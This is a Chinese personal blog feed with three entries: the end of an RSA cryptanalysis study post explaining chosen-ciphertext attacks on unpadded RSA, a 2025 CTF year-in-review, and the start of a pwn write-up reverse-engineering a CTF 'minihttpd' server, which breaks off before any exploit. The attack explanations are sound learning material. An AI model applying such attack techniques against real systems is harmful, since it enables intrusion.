mode=display">c_1*c_2=m_1^em_2^e=(m_1m_2)^e=m^e~mod(~N)</script><ul><li><p>因为RSA加密具有的同态性，这就使得RSA加密在面对选择密文攻击的时候是不安全的。以下是两种攻击策略：</p><ul><li>攻击1：给出了密文$c=m^e~mod(~N)$，要我们求出明文$m$。并且攻击者可以主动选择任意密文，可以向服务器提供解密服务，可以将解密后得到的明文发送给攻击者，但是如果尝试解密$c$就会导致错误。攻击者已知，密文$c$，公钥对$(e,N)$，攻击方法如下：<ul><li>随机选择一个$x\in Z_n$，直接计算出$c_0=cx^e~mod(~N)$的值，并且将这个值发送给服务器。</li><li>服务器对$c_0$进行解密操作，可以得到$m_0=c_0^d~mod(~N)=(cx^e)^d~mod(~N)=c^dx^{ed}~mod(~N)=mx~mod(~N)$，并将其发送给攻击者</li><li>攻击者可以很快的计算出$m=m_0x^{-1}~mod(~N)$，从而恢复出明文。</li></ul></li><li>攻击2：该攻击相当于一个中间相遇攻击，假设目标明文是$L$位的明文$m$，该明文能被分解称为两个$\frac{L}{2}$位的因子$m_1$和$m_2$也就是$m=m_1m_2$。服务也是提供解密服务，攻击者传入密文给服务器，服务器计算出明文并返回给攻击者。攻击者已知$m$对应的密文$c$，以及公钥对$(e,N)$，要求的就是明文$m$。<ul><li>首先构造一张表，里面存储着可能的$\frac{L}{2}$位数的$m_1$及其加密之$m_1^e~mod(~N)$。</li><li>随后，对每一个可能的$\frac{L}{2}$位数的$m_2$，计算并检查$c·m_2^{-e}~mod(~N)$是否与某个加密之相匹配。</li><li>当$m_2=m_2^{*}$的时候就有$c·m_2^{-e}~mod(~N)=(m_1m_2)^e·m_2^{-e}~mod(~N)=m_1^e~mod(N)$必然在表中会出现。这样就可以计算得到$m$。</li></ul></li></ul></li><li><p>在实际应用中，使用恰当的填充规则，例如<code>OAEP</code>填充规则，就足够避免这些攻击了。</p></li></ul><h2 id="语义安全性"><a href="#语义安全性" class="headerlink" title="语义安全性"></a>语义安全性</h2><ul><li>语义安全密码系统指的就是：给定一个密文及其公钥，攻击者无法以显著概率（non-negligible probability）推断出任何关于对应明文的信息。简单来说，语言安全性偏向判断或者获取一些信息，例如判断两个密文$c_1,c_2$哪个密文是由明文$m$通过RSA加密得到的。</li><li>我们上面说的没有进行填充等处理的原始RSA加密并不是语义安全的密码系统。特别地，任何确定性的密码系统都不可能是语义安全的。给定两个明文消息和其中一个密文，攻击者总是可以判断哪个明文对应该密文。因此，任何语义安全的密码系统都必须是概率性的。</li><li>此外对于RSA加密，可以很容易证明，明文的雅可比符号（以及模数）可以通过密文的雅可比符号暴露出来。具体而言，对于任意明文$m$及其对应密文$c$，有：</li></ul><script type="math/tex; mode=display">(\frac{c}{N})=(\frac{m}{N})</script><ul><li>因此，仅凭密文和公钥就能泄露部分明文信息。当然使用<code>OAEP</code>填充的RSA加密，在RSA假设成立的前提下，可以证明其是语言安全的。</li></ul><h1 id="rsa效率"><a href="#RSA效率" class="headerlink" title="RSA效率"></a>RSA效率</h1><ul><li><p>对于RSA加密的效率，主要考虑的就是素数生成和模幂运算的计算开销，这两者分别是密钥生成算法和加密解密算法中的主要操作。</p></li><li><p>RSA密钥生成算法：</p><ul><li>需要生成的两个随机平衡素数，使用<code>Miller-Rabin</code>素性测试结合试除法。</li><li>生成一个n位随机素数，其期望运行时间为$O(\frac{n^4}{log(n)}+tn^3)$</li><li>该方法输出复合数而非素数的概率最多为$4^{-t}$。</li><li>上述复杂度假设使用的是简单的二次运算，通过使用更快的乘法方法可以有所改进，但采用已知最快的方法生成n位素数，其复杂的也至少为$O(n^2)$。</li><li>对于较大的模数，这可能是一个昂贵的操作，尤其是在需要生成大量素数的情况下。</li></ul></li><li>对于RSA加密的模幂操作运算效率就这里暂时不说了。</li></ul><h1 id="rsa数字签名"><a href="#RSA数字签名" class="headerlink" title="RSA数字签名"></a>RSA数字签名</h1><p>RSA原语同时可以被用于构建加密方案和数字签名方案。本质上，简化地说，解密操作可以用来对文档进行签名，而加密操作可以用来验证数字签名。</p><h1 id="rsa变种"><a href="#RSA变种" class="headerlink" title="RSA变种"></a>RSA变种</h1><ul><li>在RSA专利中，三个RSA的发明人<code>Rivest、Shamir 和 Adleman</code>提到：可以使用三个或者更多素数（不一定互不相同）相乘得到。解密分别可以分别对n的每一个素因子进行，然后利用中国剩余定理或任何等效方法将结果组合起来，从而得到对n的最终结果。</li><li>因此，从RSA发明以来，对RSA的变种创造也已经存在了，研究RSA变种的主要原因是以某种方式提高RSA的效率。<ul><li>CRT-RSA、多素数RSA、多幂RSA：都是为了更快的生成密钥和更快的解密。</li><li>共素数RSA：抵抗已知的RSA攻击。</li><li>对偶RSA：降低存储公钥和私钥所需的内存空间。</li><li>还有比较多的RSA变体可以自行了解，包括但不限于<code>Rabin加密算法</code>、<code>使用Dickson 多项式的RSA加密算法</code>、<code>使用Lucas 数列的RSA加密算法</code></li></ul></li></ul><h1 id="rsa攻击数学基础"><a href="#RSA攻击数学基础" class="headerlink" title="RSA攻击数学基础"></a>RSA攻击数学基础</h1><ul><li><p>对于密码分析学的数学要求，会比学密码编码学的数学要求高一点，而且也比较杂。这边建议对于初学者来说学一点数学知识，然后再学一点密码分析学的攻击手法，用密码分析学的攻击手法来理解所学的数学知识会好点。这样就不会因为前期花太多时间在数学上，也不会导致到后面的密码分析学需要的数学知识比较深和多而停滞不前。缺点就是每个攻击手法学的比较慢就是了，并且有的可能还得跳过之后再学（其实有的只需要会用脚本就行，原理之后再说。）</p></li><li><p>这里先列出RSA攻击所涉及的一些数学知识，顺便也需要学点算法：</p><ul><li>初等数论（先学），高等代数（最好直接学高等代数，别看线性代数了），格密码入门。</li><li>抽象代数，代数数论，交换代数，解析数论，数的几何。</li><li>认知有限无法推荐更多内容。</li></ul></li><li>现在就列出一些RSA密码分析学中涉及到的一些数学概念和结论：<ul><li>数学概念：集合、向量、多项式、渐进符号、连分数、格（数学中有两种格，我们所说的是向量空间的那个格）</li><li>数学结论：中国剩余定理（初等数论）、斯密特正交化（高等代数）、结式（高等代数）、连分数逼近定理（初等数论）</li><li>算法：整数分解、格基规约算法（包括LLL算法等）、最短向量问题（格）</li><li>其他：解线性方程、模线性等式、Coppersmith方法以及一堆相关的多项式、计算和改进边界。</li></ul></li></ul>]]></content>
    
    
    <summary type="html">前言：思来想去，还是以这篇作为正式学习RSA密码分析的博客</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="RSA" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/RSA/"/>
    
    
  </entry>
  
  <entry>
    <title>2025年度总结</title>
    <link href="http://iyheart.github.io/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>http://iyheart.github.io/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</id>
    <published>2025-12-30T23:30:11.000Z</published>
    <updated>2025-12-31T23:47:31.868Z</updated>
    
    <content type="html"><![CDATA[<ul><li>今天是2025年12月31号，也就是2025年的最后一天，打算在2025年的最后一天写下这个年度总结。</li></ul><h1 id="回顾与总结"><a href="#回顾与总结" class="headerlink" title="回顾与总结"></a>回顾与总结</h1><ul><li><p>今年感觉算是忙碌但又有收获的一年，技术算是在稳中求进吧，进步没那么快也没那么大。</p></li><li><p>今年比较遗憾的其实算是没有看一本课外书，这个感觉坚持下来有点困难，还需要调整一下。</p></li><li>今年又是快乐的一年，认识了su的哥哥们，并且与哥哥们一起打了好多线上CTF比赛。</li><li>也十分感谢校内队友以及学长的带飞和包容。</li></ul><h1 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h1><ul><li>2026年希望给自己定一些小目标，也算是将自己想做的事情写下来吧。有些大目标就不写了，写一些小目标。<ol><li>在国内比较大的比赛中出一题<code>PWN</code>或者<code>密码</code>的题目。</li><li>在2026年一年之内认真看看两本书。</li><li>学完<code>《Cryptanalysis of RSA and Its Variants (M. Jason Hinek)》</code></li><li>尝试挖个洞，有自己的cve或者cnvd</li><li>把格密码给入门咯</li></ol></li></ul><h1 id="2025年1月"><a href="#2025年1月" class="headerlink" title="2025年1月"></a>2025年1月</h1><p>1月的上旬都是在期末突击考试，没啥时间，最后10天考4门课在大一的时候还是没有体验过，考到最后一门操作系统的时候前一天晚上直接通宵了，第二天八点直接去考场考试了，考完当天下午就坐车回家去了。回去的第一件事就是好好睡觉。</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231085825356.png" alt="image-20251231085825356"></p><p>1月中旬就是把<code>ciscn2025</code>给复现了一下，然后就是接踵而至的一些比赛了，suctf2025，春秋杯冬季赛，西湖论剑都没打出什么好成绩，自己还是太菜了（其实反思下来就是感觉自己想学的东西太多了，不能专心攻略一个方向，哈哈哈）。</p><p>1月下旬就随便学学东西了，数学的初等数论、PWN的堆也学了一点，并且在<code>1月28日、1月29日</code>就过年了，感觉也没学多少东西。</p><p>对了，其实要是没有比赛的话，每天晚上吃完晚饭都会出去走走，要说玩游戏的话，基本上就是玩玩CF了，也不知怎么回事寒假那会打CF手感还挺好的。</p><h1 id="2025年2月"><a href="#2025年2月" class="headerlink" title="2025年2月"></a>2025年2月</h1><p>很快就到二月了，参加了<code>VNCTF2025</code>、<code>Hgame2025</code>，这两个比赛也没打出什么好成绩。还顺便把电脑的内存条换成了一个<code>32GB</code>的，不得不说换了个<code>32GB</code>的内存条好像电脑更耐造了。</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231091510702.png" alt="image-20251231091510702"></p><p>而且<code>Hgame2025</code>的第二周就没怎么打了，在想着如何给新生赛出一道简单的<code>v8</code>题，但是那时候自己对<code>Google v8</code>的原理还是了解太少了，并且<code>v8</code>算是自己有去该源码的一个大项目了（虽然自己改没怎么改成功），基本上那一整个星期都在了解<code>v8</code>、编译<code>v8</code>。之后实在没办法，就拿其他<code>v8</code>题目改了改拿来用了。</p><p>之后确实想学<code>v8</code>，并且<code>v8</code>在b站上还是有相关视频的，但是反复观看<code>第01课</code>13遍还停留在<code>第01课</code>也是没谁了，其实<code>第01课</code>还没看完。</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231093908650.png" alt="image-20251231093908650"></p><h1 id="2025年3月"><a href="#2025年3月" class="headerlink" title="2025年3月"></a>2025年3月</h1><p>三月初就迎来了咱们学校出题的一个新生赛也就是<code>GHCTF</code>，这场比赛也算是我第一次作为出题人的比赛，之前我都是作为选手，今年第一次尝试出题。</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231111747799.png" alt="image-20251231111747799"></p><p>三月中旬就到了<code>ciscn2025</code>半决赛了，这次半决赛在广州的暨南大学举办，去打比赛的同时也顺便去广州玩玩。（还是要感谢队友们线上赛的带飞，有一说一还是感觉自己太菜了，其实还挺想带飞队友一次的，不过好像没机会了，大三了大家都不打CTF了，而且国内CTF环境不想评价，再加上AI的发展导致CTF变得失去了原有的味道。）</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/qq_pic_merged_1767151581587.jpg" alt="qq_pic_merged_1767151581587"></p><p>比赛结束的第二天顺便在河对面看了看广州塔，有一说一旅游淡季人真少，要是时间再充足点就直接买票上广州塔了，初中那会暑假来广州旅游但是广州塔那会人太多了，不太想排队，就没上去了。还有一件特别难绷的事情就是，我把ciscn那个免费发下来的外套给落在宾馆了QAQ。</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/IMG_20250317_111545.jpg" alt="IMG_20250317_111545"></p><p>三月下旬的时候发现学校打CTF的人太少了，每一级也就那么几个人打，感觉就是没那氛围和环境。看很多厉害的师傅都去联合战队了，也就萌生出了进联合战队的想法。所以当时就联系了包包，想问问关于联合战队的事情，包包建议我尝试投一下简历，由于我CTF没打出什么成绩，确实不太自信，还是有点不敢投，不过还是投了，不出意外被拒了。</p><h1 id="2025年4月"><a href="#2025年4月" class="headerlink" title="2025年4月"></a>2025年4月</h1><p>到了四月上旬，清明那会打了打<code>XYCTF2025</code>，依旧被队友带飞得到贴纸的一次，假期结束之后，就是正常的上课了。四月上旬的最后一俩天，包包问我简历投的怎么样了，发现我还没加联队，就邀请我来su试试看，先作为<code>candidate</code>和su的哥哥们一起打线上的国际赛。现在回想起来真的非常感谢包包的邀请，su的哥哥们真的很好，平时氛围也不错，而且也很有打比赛的氛围。（其实大一暑假那会有和自己专业的同学组队去打打国际赛，但是就我和他两个人，打着很坐牢就越打越没劲的那种）</p><p>四月中旬，数字中国的一场比赛在师大那边举办就和山东警察学院的几个师傅面基了，后来到今年12月才知道原来su的哥哥也有来数字中国，当时刚去su作为<code>candidate</code>和其他师傅都不太熟悉，错过了这次面基机会，可惜了。</p><p>四月下旬，从四月中旬到四月下旬跟着一起和su的哥哥们打了几场国际赛，牢是挺牢的但是做出题目的那一刻还是很爽的。在四月底迎来了比较有重要意义的比赛<code>xctf分站赛actf</code>。由于<code>actf</code>只举办一天，不过那天还有<code>fic</code>取证比赛因为之前和校内队友报了<code>fic</code>，所以当时白天打了<code>fic</code>。吃完晚饭，晚上开始和su的哥哥们一起牢actf，直接熬到第二天凌晨4点，做出来一道pwn题，也是第一次在xctf中做出来的一道题。可以当时就差一道题，就能进xctf前10了。</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231154258992.png" alt="image-20251231154258992"></p><h1 id="2025年5月与6月"><a href="#2025年5月与6月" class="headerlink" title="2025年5月与6月"></a>2025年5月与6月</h1><p>这两个月确实过得平淡点，五月份有个比赛我就不做评价了，26年绝对不打了。这两个月就在期末突击和打打比赛度过了。并且su又来了几位厉害的师傅。</p><p>其实还有一点就是，当时还有想学密码学的想法，最后确定密码和pwn都学，密码是兴趣pwn是生活（以后可能要靠二进制岗位吃饭的或者直接跑去搞开发了）。</p><p>期末考完的第二天直接去看了名侦探柯南的大电影，时隔一年半又看了一场电影，上次看电影是在大一寒假和高中同学一起看飞驰人生2，也算是在研究计算机之余<code>ret2life</code>了一下。</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231214028806.png" alt="image-20251231214028806"></p><h1 id="2025年7月"><a href="#2025年7月" class="headerlink" title="2025年7月"></a>2025年7月</h1><p>七月上旬，刚放假就直接学了点逆向，跟着逆向老钱去学PE文件结构，学着玩玩，毕竟大三有逆向课。继续和su的师傅打打国际赛以及xctf</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231155756696.png" alt="image-20251231155756696"></p><p>七月中旬，由于自己这一学期来比较会熬夜和通宵，导致放假回家作息调不过来，就去看了中医，中医说是我的湿气比较重，开了几副中药给我吃，那5天真的什么都不敢乱吃。可馋死我了。这些天每天都学了点东西，没有太肝（养身体呢）。然后还看学了初等数论，看的是无尽砂砾的视频</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231160524904.png" alt="image-20251231160524904"></p><p>七月下旬，过得也比较平淡，得了一个比较严重的感冒（鼻子塞着是真难受，可能还有点发烧），然后自己感觉也有点内耗了，su的哥哥们都好强，比赛的时候抢不到题目写了，难的我又写不出来QAQ，纠结着又内耗起来，之后调节过来了，跟着好哥哥们打比赛，有氛围又能学到东西，真的很好了。</p><h1 id="2025年8月"><a href="#2025年8月" class="headerlink" title="2025年8月"></a>2025年8月</h1><p>八月是惊喜的一个月。八月开始过得还是比较平淡的，国内和国际比赛都比较多，六级查分（六级还是没过就是了）。经历了七月份的感冒后，八月做了个改变，每天晚上吃完饭必走3个多小时，从晚上<code>5</code>、<code>6</code>点一直走到<code>9</code>点。甚至走两个小时的路程用跑着回家。在八月份在随便乱看视频中找到了两个对数学教学颇有心得的两个老师。</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231162837462.png" alt="image-20251231162837462"></p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231162847137.png" alt="image-20251231162847137"></p><p>这样一直持续到了8月29号快开学了，并且当时有个<code>tfcCTF2025</code>，看了一题<code>MT19937</code>由于数据接收问题收集不到太多位数，导致那题还没出。刚好8月30号早上要做车回学校，有点睡不着深夜就继续看了看这题，有一说一深夜服务器压力比较小，接收的确实比较快，再结合着鸡块师傅的博客，把这题肝出来了。</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231163535756.png" alt="image-20251231163535756"></p><p>打完tfctf之后，也就是八月的最后一天，包包告诉我，我也是su的一员了。真没想到八月的最后一天还有惊喜，当时真的好激动。终于是su的一员了。</p><h1 id="2025年9月"><a href="#2025年9月" class="headerlink" title="2025年9月"></a>2025年9月</h1><p>9月过的也是平平淡淡的，并且25级新生报到一些新生的传承还得继续下去。9月还有WMCTF2025，还有其他难度较高的比赛。打的真的自闭。</p><h1 id="2025年10月"><a href="#2025年10月" class="headerlink" title="2025年10月"></a>2025年10月</h1><p>月初国庆，这几周国际赛和国内大战队举办的比赛，强度都太高了导致对国际赛有点恐惧了，所以国庆就没和su的哥哥们打国际赛了。自己跑去打了东南大学的校赛<code>susctf</code>。<code>susctf</code>是个人赛，当时pwn就差一题内核题就ak了，并且在做完pwn后也做了道简单的安卓逆向。排名忘记截图了QAQ（没有记录的习惯唉，2026年还是得好好记录一下）。还好有贴纸，不过很难绷的一点就是当时没拍照和截图，只能附上一张邮件截图了。</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231205710968.png" alt="image-20251231205710968"></p><p>还有就是国庆还花一天时间去和好朋友一起去玩了一天，相当快乐的一天，又是<code>ret2life</code>的一次，还发现了家宝藏店铺（氛围感十足）。</p><p>国庆回去之后就是给新生宣讲，大三了也算是也成为老学长了，但是对于如何处理人际关系这方面感觉还是有所欠缺的。而且在某些需要做决定的情况，如果涉及到的是一个团队的话其实我更喜欢和队友商量着来的，但是着样就感觉比较花时间，久而久之就有点想躺平了。</p><h1 id="2025年11月"><a href="#2025年11月" class="headerlink" title="2025年11月"></a>2025年11月</h1><p>十一月前两个星期全都在准备美亚杯，临时决定要打美亚杯，只能是认认真真复现几场比赛的题目就上去参赛了。个人赛发挥还不错，团队赛我真有点犯蠢了。（唉，有点开始质疑自己的团队配合能力了，就是感觉每次团队赛我配合的都不是很好，难道我真的比较适合做一个独行侠么）。好在今年美亚杯个人赛的获奖比例增加了，也不至于像去年一样空手而归。（有一说一美亚杯个人赛能获奖感觉是今年U盘题目是考PE相关的，涉及到启动流程以及BIOS以及UEFI这种，因为3月底还有了解一点UEFI开发，刚好这次美亚就派上用场了。）</p><p>美亚杯参加结束之后就是考试加上协会面试。</p><h1 id="2025年12月"><a href="#2025年12月" class="headerlink" title="2025年12月"></a>2025年12月</h1><p>12月也算是比较平淡的一个月吧，基本上都在期末突击中，由于现在不怎么关心绩点，所以考逆向的时候就前一个晚上看了点东西就直接去考试了。之后就是六级，今年六级也爆难。考完六级又是取证，其实突击压力最大的还是概率论与数理统计，一个学期的课程直接五天速通了一下。在突击概率论与数理统计的时候，又发现了一个讲得比较好的数学up。</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231211415888.png" alt="image-20251231211415888"></p><p>考完概统的第二天就是ciscn了，今年ciscn的题目画风大变，pwn难度飙升，密码都没几题。还是爆零的一次ciscn，唉。minihttpd真是意难平，逆了半天洞找到了，一开始能泄露地址，结果到后面地址怎么也泄露不出来。当时写的exp基本上没啥大问题，第二天复现的时候一下子就打出来了。（这里能逆出minihttpd，还是得感谢学长的<code>fruit ninja</code>，以及当时的自己能耐着性子把<code>fruit ninja</code>给复现完，才有能够逆向出minihttpd的信心。）</p><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231211859564.png" alt="image-20251231211859564"></p><h1 id="b站部分年度总结"><a href="#B站部分年度总结" class="headerlink" title="B站部分年度总结"></a>B站部分年度总结</h1><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231214536811.png" alt="image-20251231214536811"></p><h1 id="酷狗部分年度总结"><a href="#酷狗部分年度总结" class="headerlink" title="酷狗部分年度总结"></a>酷狗部分年度总结</h1><p><img src="/2025/12/31/%E6%80%BB%E7%BB%93/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20251231214616693.png" alt="image-20251231214616693"></p>]]></content>
    
    
    <summary type="html">前言：自己想写。</summary>
    
    
    
    <category term="年度总结" scheme="http://iyheart.github.io/categories/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn2026复现</title>
    <link href="http://iyheart.github.io/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/"/>
    <id>http://iyheart.github.io/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-12-29T01:10:19.000Z</published>
    <updated>2025-12-30T02:51:11.527Z</updated>
    
    <content type="html"><![CDATA[<ul><li>这次PWN终于不是堆了，不喜欢打堆，已经往实战偏了，好兆头。比赛一开始上了内核题和另外一道题，内核没学就没去看了。另外一道题逆了半天又是<code>server</code>又是<code>proxy</code>，没啥思路。</li><li>等第二次上题的时候发现有个<code>minihttpd</code>，由于之前学长在新生赛出了一题<code>fruit ninja</code>（这真得感谢学长了），也是关于<code>httpd</code>的，赛后复现了一下对<code>httpd</code>稍微有点了解，所以就直接开看。<code>minihttpd</code>真是酣畅淋漓的逆向和调试，真的牢爽了。</li><li>但貌似今年密码题的质量太低了，一共三题，去年密码貌似强度比较高。</li></ul><h1 id="pwn"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="minihttpd复现"><a href="#minihttpd-复现" class="headerlink" title="minihttpd(复现)"></a>minihttpd(复现)</h2><p>真是酣畅淋漓的逆向</p><h3 id="分析程序1"><a href="#分析程序1" class="headerlink" title="分析程序1"></a>分析程序1</h3><ul><li><p>对于分析程序这里主要是赛后复现，所以先逆再调试了，而赛中的时候是先逆一部分，再进行调试，边调试边将程序逆完。</p></li><li><p>首先查看一下保护机制与沙箱，这边沙箱是在逆向的时候得知这个程序开启了沙箱。</p><ul><li>可以得知，这个程序没有开启<code>pie</code>保护，以及<code>canary</code>保护。</li><li>并且这个程序开启沙箱只禁用了<code>execve</code>和<code>execveat</code>这两个系统调用。</li><li>所以合理猜测考的就是栈溢出+ORW类型的题目（这里就直接从这两个分析出来，其实在比赛的时候还不知道是考什么东西，逆了2小时或者3小时才找到洞）</li></ul></li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229133559816.png" alt="image-20251229133559816"></p><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229133516297.png" alt="image-20251229133516297"></p><ul><li>接下来就是使用<code>IDA pro</code>反编译这个程序。先来查看一下<code>main</code>函数，在main函数这边关键点其实就是在这四个位置中。<ul><li>其中<code>init_0()</code>这个就是一个开沙箱操作，并且还有设置了三个<code>signal()</code>。</li><li>其次<code>mybind()</code>就是正常的绑定端口，这个函数的返回值就是<code>fd</code>文件描述符，这里一般来说是<code>3</code>（但是也说不准）。</li></ul></li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229134131617.png" alt="image-20251229134131617"></p><ul><li>再着就是<code>bindurl()</code>，这边详细说明一下<code>bindurl()</code>具体执行什么操作。这个地方就是相当于绑定一个路径，这个路径表明了你使用<code>post</code>方法访问指定的<code>url</code>会执行指定的函数。</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229134459565.png" alt="image-20251229134459565"></p><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229135416655.png" alt="image-20251229135416655"></p><h3 id="分析程序2"><a href="#分析程序2" class="headerlink" title="分析程序2"></a>分析程序2</h3><ul><li>在<code>main</code>函数中的最后一个重要函数其实就是多线程创建函数，该函数我们主要在意的就是第三个参数和第四个参数。<ul><li>创建多线程的第三个参数，这个参数是一个函数指针，指向的是创建一个线程后该线程要执行的函数。</li><li>创建多线程的第四个参数，这个参数是一个指针类型，根据上面的内容传递的是，<code>accept()</code>的返回值，即客户端与该程序建立连接后在该程序中指定的一个文件描述符。</li></ul></li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229135620031.png" alt="image-20251229135620031"></p><ul><li>接下来就是看多线程函数具体的程序逻辑，这个函数有<code>151</code>行，其中非常多行都是错误处理（算是比较贴近真实的开发了）。因为之前校赛打<code>fruit ninja</code>的时候就逆过<code>httpd</code>的这种程序，所以懂得大概的处理流程。大概的流程如下：<ul><li>接收请求头，并判断请求头是否合法，有没有什么非法字符。</li><li>并判断请求头所使用的方法，如果是<code>GET</code>方法就按照<code>GET</code>方法来处理，就接收一些参数。如果是<code>POST</code>方法就按照<code>POST</code>方法来处理，接收body的长度<code>Content-Length:</code>，以及<code>body</code>的种。类（是正常字符流，还是json格式的，当然这个程序没有接收种类）。</li><li>之后就是根据参数和路径判断使用哪些函数来处理，该发送哪些响应回去，该发送哪些资源文件到客户端去，该程序需要执行什么东东。</li></ul></li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229140142985.png" alt="image-20251229140142985"></p><ul><li>接下来按照上面的流程来逆向就会舒服很多</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229140741861.png" alt="image-20251229140741861"></p><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229140814236.png" alt="image-20251229140814236"></p><ul><li>用<code>POST</code>方法请求处理的部分</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229141102132.png" alt="image-20251229141102132"></p><ul><li>接下来就是错误处理的部分，以及没有错误的时候具体执行什么。</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229141801505.png" alt="image-20251229141801505"></p><h3 id="分析程序3"><a href="#分析程序3" class="headerlink" title="分析程序3"></a>分析程序3</h3><ul><li>通过分析<code>GET</code>方法的请求处理，发现<code>GET</code>方法这边没洞</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229142049213.png" alt="image-20251229142049213"></p><ul><li>现在需要把重点放在<code>POST</code>方法，以及处理<code>POST</code>方法请求的对应响应函数中。其实就是这四个函数中</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229142204757.png" alt="image-20251229142204757"></p><ul><li>在赛中通过调试确定了<code>POST</code>请求方法的具体格式，以路径为<code>hello</code>的<code>POST</code>方法为例子，其实还是没有太在意http请求的细节，导致赛中是边调试边猜才得到正确的请求格式（其实就是web打少了）</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /hello\r\n</span><br><span class="line">Content-Length:xx\r\n</span><br><span class="line"></span><br><span class="line">aaaaa</span><br></pre></td></tr></table></figure><ul><li>接下来看看这些函数具体执行什么流程。<code>hellopost()</code>比较简单，就是这个流程。使用<code>POST</code>方法执行流程后就会返回这样的响应</li></ul><p><img 